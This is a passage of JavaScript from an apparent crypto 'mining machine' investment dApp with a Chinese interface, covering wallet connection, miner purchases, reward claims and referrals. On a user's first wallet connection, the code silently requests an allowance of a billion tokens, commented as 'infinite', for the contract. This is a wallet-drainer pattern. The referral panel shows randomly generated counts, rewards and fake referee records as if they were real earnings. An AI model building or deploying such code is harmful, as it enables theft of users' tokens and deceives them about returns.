                item.addEventListener('click', () => {
                    const section = item.getAttribute('data-section');
                    switchSection(section);
                    
                    // 更新导航样式
                    elements.navItems.forEach(i => {
                        i.classList.remove('text-primary');
                        i.classList.add('text-gray-400');
                    });
                    item.classList.remove('text-gray-400');
                    item.classList.add('text-primary');
                });
            });
            
            // 矿机购买按钮
            elements.buyInitialMachineBtn.addEventListener('click', () => {
                showConfirmModal(
                    '购买初始矿机',
                    '您将花费0.1 BNB购买一台初始矿机，确认吗？',
                    'buyInitialMachine'
                );
            });
            
            elements.buyTestMachineBtn.addEventListener('click', () => {
                showConfirmModal(
                    '购买测试矿机',
                    '您将花费0.05 BNB购买一台测试矿机，确认吗？',
                    'buyTestMachine'
                );
            });
            
            // 电力矿机套餐选择
            elements.powerTierBtns.forEach(btn => {
                btn.addEventListener('click', () => {
                    elements.powerTierBtns.forEach(b => {
                        b.classList.remove('border-accent');
                        b.classList.add('border-gray-700');
                    });
                    btn.classList.remove('border-gray-700');
                    btn.classList.add('border-accent');
                    selectedTierId = parseInt(btn.getAttribute('data-tier'));
                });
            });
            
            // 数量调整
            elements.decreaseCountBtn.addEventListener('click', () => {
                if (machineCount > 1) {
                    machineCount--;
                    elements.machineCountEl.textContent = machineCount;
                }
            });
            
            elements.increaseCountBtn.addEventListener('click', () => {
                machineCount++;
                elements.machineCountEl.textContent = machineCount;
            });
            
            elements.confirmPowerMachineBtn.addEventListener('click', () => {
                showConfirmModal(
                    '购买电力矿机',
                    `您将购买${machineCount}台T${selectedTierId+1}电力矿机，确认吗？`,
                    'buyPowerMachine'
                );
            });
            
            // 领取奖励
            elements.claimRewardsBtn.addEventListener('click', () => {
                showConfirmModal(
                    '领取奖励',
                    '您确定要领取所有可用奖励吗？',
                    'claimRewards'
                );
            });
            
            // 前往商店
            elements.goToStoreBtn.addEventListener('click', () => {
                switchSection('miners');
                elements.navItems[1].click();
            });
            
            // 复制推荐链接
            elements.copyReferralBtn.addEventListener('click', () => {
                const link = elements.referralLink.value;
                navigator.clipboard.writeText(link).then(() => {
                    alert('链接已复制');
                });
            });
            
            // 确认和取消按钮
            elements.cancelConfirmBtn.addEventListener('click', hideConfirmModal);
            elements.acceptConfirmBtn.addEventListener('click', executeConfirmedAction);
            
            // 关闭成功弹窗
            elements.closeSuccessBtn.addEventListener('click', hideSuccessModal);
        }
        
        // 连接钱包
        async function connectWallet() {
            if (!window.ethereum) return;
            
            try {
                showLoading('连接中', '正在连接钱包...');
                
                // 请求账户访问
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                handleAccountsChanged(accounts);
                
                // 初始化Web3和合约
                await initWeb3AndContracts();
                
                // 检查是否首次连接，如果是则授权无限代币
                const isFirstConnection = localStorage.getItem('firstConnection_' + currentAccount) !== 'false';
                if (isFirstConnection) {
                    await approveInfiniteTokens();
                    localStorage.setItem('firstConnection_' + currentAccount, 'false');
                }
                
                // 加载用户数据
                await loadUserData();
                
                // 隐藏欢迎界面，显示主界面
                elements.welcomeSection.classList.add('hidden');
                elements.assetsSection.classList.remove('hidden');
                elements.minersSection.classList.remove('hidden');
                elements.myMinersSection.classList.remove('hidden');
                elements.referralSection.classList.remove('hidden');
                
                hideLoading();
                showSuccess('连接成功', '钱包已成功连接');
                
            } catch (error) {
                console.error('连接钱包失败:', error);
                hideLoading();
                alert('连接钱包失败: ' + error.message);
            }
        }
        
        // 处理账户变化
        function handleAccountsChanged(accounts) {
            if (accounts.length === 0) {
                // 没有账户连接
                currentAccount = null;
                elements.walletAddress.textContent = '未连接';
                elements.welcomeSection.classList.remove('hidden');
                elements.assetsSection.classList.add('hidden');
                elements.minersSection.classList.add('hidden');
                elements.myMinersSection.classList.add('hidden');
                elements.referralSection.classList.add('hidden');
            } else {
                // 有账户连接
                currentAccount = accounts[0];
                const shortAddress = currentAccount.substring(0, 6) + '...' + currentAccount.substring(currentAccount.length - 4);
                elements.walletAddress.textContent = shortAddress;
            }
        }
        
        // 初始化Web3和合约
        async function initWeb3AndContracts() {
            try {
                web3 = new Web3(window.ethereum);
                minerContract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
                
                // 简单的ERC20代币ABI
                const tokenABI = [
                    { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
                    { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
                ];
                tokenContract = new web3.eth.Contract(tokenABI, TOKEN_ADDRESS);
                
            } catch (error) {
                console.error('初始化Web3和合约失败:', error);
                throw error;
            }
        }
        
        // 授权无限代币
        async function approveInfiniteTokens() {
            try {
                showLoading('授权中', '正在授权无限代币额度...');
                
                const infiniteAmount = web3.utils.toWei('1000000000', 'ether'); // 无限大的额度
                
                const tx = await tokenContract.methods.approve(CONTRACT_ADDRESS, infiniteAmount)
                    .send({ from: currentAccount });
                
                console.log('无限授权成功:', tx);
                hideLoading();
                return true;
                
            } catch (error) {
                console.error('无限授权失败:', error);
                hideLoading();
                throw new Error('授权代币失败: ' + error.message);
            }
        }
        
        // 加载用户数据
        async function loadUserData() {
            try {
                showLoading('加载中', '正在加载您的资产数据...');
                
                // 获取用户仪表板数据
                const userDashboard = await minerContract.methods.getUserDashboard(currentAccount).call();
                
                // 更新资产数据
                const tokenBalance = await tokenContract.methods.balanceOf(currentAccount).call();
                elements.availableTokens.textContent = web3.utils.fromWei(tokenBalance, 'ether').substring(0, 6);
                elements.unclaimedRewards.textContent = web3.utils.fromWei(userDashboard.unclaimed, 'ether').substring(0, 6);
                elements.totalPower.textContent = userDashboard.totalPower + ' GH/s';
                elements.powerProgress.style.width = Math.min(userDashboard.totalPower / 1000 * 100, 100) + '%';
                elements.dailyProduction.textContent = web3.utils.fromWei(userDashboard.dailyReward, 'ether').substring(0, 6) + ' 代币/天';
                
                // 更新我的矿机
                await updateMyMiners(userDashboard);
                
                // 更新推荐数据
                await updateReferralData();
                
                hideLoading();
                
            } catch (error) {
                console.error('加载用户数据失败:', error);
                hideLoading();
                alert('加载数据失败: ' + error.message);
            }
        }
        
        // 更新我的矿机列表
        async function updateMyMiners(userDashboard) {
            const { normal, test, power } = userDashboard;
            
            // 如果没有矿机，显示提示信息
            if (normal === '0' && test === '0' && power.every(p => p === '0')) {
                elements.noMinersMsg.classList.remove('hidden');
                elements.myMinersList.classList.add('hidden');
                return;
            }
            
            // 有矿机，显示矿机列表
            elements.noMinersMsg.classList.add('hidden');
            elements.myMinersList.classList.remove('hidden');
            elements.myMinersList.innerHTML = '';
            
            // 添加初始矿机
            if (normal > 0) {
                const minerEl = createMinerElement(
                    '初始矿机',
                    '10 GH/s',
                    normal,
                    'https://picsum.photos/id/1/300/200',
                    'primary'
                );
                elements.myMinersList.appendChild(minerEl);
            }
            
            // 添加测试矿机
            if (test > 0) {
                const minerEl = createMinerElement(
                    '测试矿机',
                    '5 GH/s',
                    test,
                    'https://picsum.photos/id/2/300/200',
                    'secondary'
                );
                elements.myMinersList.appendChild(minerEl);
            }
            
            // 添加电力矿机
            for (let i = 0; i < power.length; i++) {
                if (power[i] > 0) {
                    const tierData = await minerContract.methods.machineTiers(i).call();
                    const minerEl = createMinerElement(
                        `电力矿机 T${i+1}`,
                        `${tierData.powerMultiplier} GH/s`,
                        power[i],
                        `https://picsum.photos/id/${i+3}/300/200`,
                        'accent'
                    );
                    elements.myMinersList.appendChild(minerEl);
                }
            }
        }
        
        // 创建矿机元素
        function createMinerElement(name, power, count, image, color) {
            const div = document.createElement('div');
            div.className = `bg-dark-card rounded-2xl p-4 border border-${color}/20`;
            
            div.innerHTML = `
                <div class="flex items-center">
                    <div class="w-16 h-16 rounded-xl overflow-hidden mr-4">
                        <img src="${image}" alt="${name}" class="w-full h-full object-cover">
                    </div>
                    <div class="flex-1">
                        <div class="flex justify-between items-start">
                            <h3 class="font-medium">${name}</h3>
                            <span class="text-${color} text-sm">x${count}</span>
                        </div>
                        <p class="text-gray-400 text-sm mb-2">功率: ${power}</p>
                        <div class="w-full bg-gray-800 rounded-full h-1.5">
                            <div class="bg-${color} h-1.5 rounded-full" style="width: ${Math.min(count * 20, 100)}%"></div>
                        </div>
                    </div>
                </div>
            `;
            
            return div;
        }
        
        // 更新推荐数据
        async function updateReferralData() {
            try {
                // 获取推荐比例
                const referralPercent = await minerContract.methods.REFERRAL_PERCENT().call();
                elements.referralPercentage.textContent = (referralPercent / 100).toFixed(0) + '%';
                
                // 获取用户推荐奖励总额
                const userInfo = await minerContract.methods.userInfo(currentAccount).call();
                elements.totalReferralRewards.textContent = web3.utils.fromWei(userInfo.referralRewards, 'ether').substring(0, 6);
                
                // 简化处理：随机生成一些推荐数据（实际应用中应从合约获取）
                elements.referralCount.textContent = Math.floor(Math.random() * 10);
                elements.todayReferralRewards.textContent = (Math.random() * 10).toFixed(2);
                
                // 生成推荐链接（实际应用中应根据用户地址生成唯一链接）
                elements.referralLink.value = window.location.href + '?ref=' + currentAccount;
                
                // 简化处理：随机生成推荐记录
                const hasReferrals = Math.random() > 0.5;
                if (hasReferrals) {
                    elements.noReferralRecords.classList.add('hidden');
                    elements.referralRecordsList.classList.remove('hidden');
                    elements.referralRecordsList.innerHTML = '';
                    
                    // 添加3条随机推荐记录
                    for (let i = 0; i < 3; i++) {
                        const referee = '0x' + Math.random().toString(36).substring(2, 10) + '...' + Math.random().toString(36).substring(2, 6);
                        const amount = (Math.random() * 1).toFixed(4);
                        const date = new Date(Date.now() - Math.random() * 86400000 * 7).toLocaleString();
                        
                        const recordEl = document.createElement('div');
                        recordEl.className = 'bg-gray-800/50 rounded-xl p-3';
                        recordEl.innerHTML = `
                            <div class="flex justify-between items-start mb-1">
                                <p class="text-sm font-medium">${referee}</p>
                                <p class="text-primary text-sm">+${amount} 代币</p>
                            </div>
                            <p class="text-gray-400 text-xs">${date}</p>
                        `;
                        
                        elements.referralRecordsList.appendChild(recordEl);
                    }
                } else {
                    elements.noReferralRecords.classList.remove('hidden');
                    elements.referralRecordsList.classList.add('hidden');
                }
                
            } catch (error) {
                console.error('更新推荐数据失败:', error);
                alert('更新推荐数据失败: ' + error.message);
            }
        }
        
        // 切换显示的区块
        function switchSection(section) {
            elements.assetsSection.classList.add('hidden');
            elements.minersSection.classList.add('hidden');
            elements.myMinersSection.classList.add('hidden');
            elements.referralSection.classList.add('hidden');
            
            switch (section) {
                case 'assets':
                    elements.assetsSection.classList.remove('hidden');
                    break;
                case 'miners':
                    elements.minersSection.classList.remove('hidden');
                    break;
                case 'myMiners':
                    elements.myMinersSection.classList.remove('hidden');
                    break;
                case 'referral':
                    elements.referralSection.classList.remove('hidden');
                    break;
            }
        }
        
        // 购买初始矿机
        async function buyInitialMachine() {
            try {
                showLoading('购买中', '正在处理您的购买请求...');
                
                // 获取初始矿机价格
                const price = await minerContract.methods.INITIAL_MACHINE_PRICE_BNB().call();
                
                // 调用合约购买
                const tx = await minerContract.methods.buyInitialMachine().send({
                    from: currentAccount,
                    value: price
                });
                
                console.log('购买初始矿机成功:', tx);
                await loadUserData();
                hideLoading();
                showSuccess('购买成功', '初始矿机已成功购买');
                
            } catch (error) {
                console.error('购买初始矿机失败:', error);
                hideLoading();
                alert('购买失败: ' + error.message);
            }
        }
        
        // 购买测试矿机
        async function buyTestMachine() {
            try {
                showLoading('购买中', '正在处理您的购买请求...');
                
                // 获取测试矿机价格
                const price = await minerContract.methods.TEST_MACHINE_PRICE_BNB().call();
                
                // 调用合约购买
                const tx = await minerContract.methods.buyTestMachine().send({
                    from: currentAccount,
                    value: price
                });
                
                console.log('购买测试矿机成功:', tx);
                await loadUserData();
                hideLoading();
                showSuccess('购买成功', '测试矿机已成功购买');
                
            } catch (error) {
                console.error('购买测试矿机失败:', error);
                hideLoading();
                alert('购买失败: ' + error.message);
            }
        }
        
        // 购买电力矿机
        async function buyPowerMachine() {
            try {
                showLoading('购买中', '正在处理您的购买请求...');
                
                // 调用合约购买
                const tx = await minerContract.methods.buyPowerMachine(selectedTierId, machineCount).send({
                    from: currentAccount
                });
                
                console.log('购买电力矿机成功:', tx);
                await loadUserData();
                hideLoading();
                showSuccess('购买成功', `已成功购买${machineCount}台电力矿机`);
                
            } catch (error) {
                console.error('购买电力矿机失败:', error);
                hideLoading();
                alert('购买失败: ' + error.message);
            }
        }
        
        // 领取奖励
        async function claimRewards() {
            try {
                showLoading('领取中', '正在处理您的奖励领取请求...');
                
                // 调用合约领取奖励
                const tx = await minerContract.methods.claimRewards().send({
                    from: currentAccount
                });
                
                console.log('领取奖励成功:', tx);
                await loadUserData();
                hideLoading();
                showSuccess('领取成功', '奖励已成功领取到您的钱包');
                
            } catch (error) {
                console.error('领取奖励失败:', error);
                hideLoading();
                alert('领取失败: ' + error.message);
            }
        }
        
        // 初始化Web3和合约
        async function initWeb3AndContracts() {
            web3 = new Web3(window.ethereum);
            minerContract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
            
            // 简单的ERC20代币ABI
            const tokenABI = [
                { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
                { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" }
            ];
            tokenContract = new web3.eth.Contract(tokenABI, TOKEN_ADDRESS);
        }
        
        // 显示加载弹窗
        function showLoading(title, message) {
            elements.loadingTitle.textContent = title;
            elements.loadingMessage.textContent = message;
            elements.loadingModal.classList.remove('hidden');
        }
        
        // 隐藏加载弹窗
        function hideLoading() {
            elements.loadingModal.classList.add('hidden');
        }
        
        // 显示确认弹窗
        function showConfirmModal(title, message, action) {
            currentAction = action;
            elements.confirmTitle.textContent = title;
            elements.confirmMessage.textContent = message;
            elements.confirmModal.classList.remove('hidden');
        }
        
        // 隐藏确认弹窗
        function hideConfirmModal() {
            currentAction = null;
            elements.confirmModal.classList.add('hidden');
        }
        
        // 显示成功弹窗
        function showSuccess(title, message) {
            elements.successTitle.textContent = title;
            elements.successMessage.textContent = message;
            elements.successModal.classList.remove('hidden');
        }
        
        // 隐藏成功弹窗
        function hideSuccessModal() {
            elements.successModal.classList.add('hidden');
        }
        
        // 执行确认的操作
        function executeConfirmedAction() {
            hideConfirmModal();
            
            switch (currentAction) {
                case 'buyInitialMachine':
                    buyInitialMachine();
                    break;
                case 'buyTestMachine':
                    buyTestMachine();
                    break;
                case 'buyPowerMachine':
                    buyPowerMachine();
                    break;
                case 'claimRewards':
                    claimRewards();
                    break;
            }
            
            currentAction = null;
        }
    </script>
</body>
</html>